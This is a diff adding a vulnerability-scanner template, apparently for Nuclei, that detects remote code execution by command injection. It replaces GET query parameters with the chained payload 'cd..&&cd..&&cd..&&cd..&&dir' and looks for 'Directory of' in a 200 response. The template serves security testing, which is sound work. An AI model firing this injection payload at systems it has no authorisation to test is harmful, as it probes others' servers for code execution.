@@ -1,0 +1,40 @@
+id: fuzz-rce-cd-commands
+
+info:
+  name: RCE Detection via CD Command Injection
+  author: netbaan
+  severity: high
+  description: |
+    This template is designed to detect Remote Code Execution 
+    vulnerabilities by attempting to execute chained CD commands 
+    followed by a directory listing.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      rce:
+        - "cd..&&cd..&&cd..&&cd..&&dir"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Directory of"  # Look for the typical output for directory listing
+
+      - type: status
+        status:
+          - 200  # HTTP status should be 200 for successful command execution indication
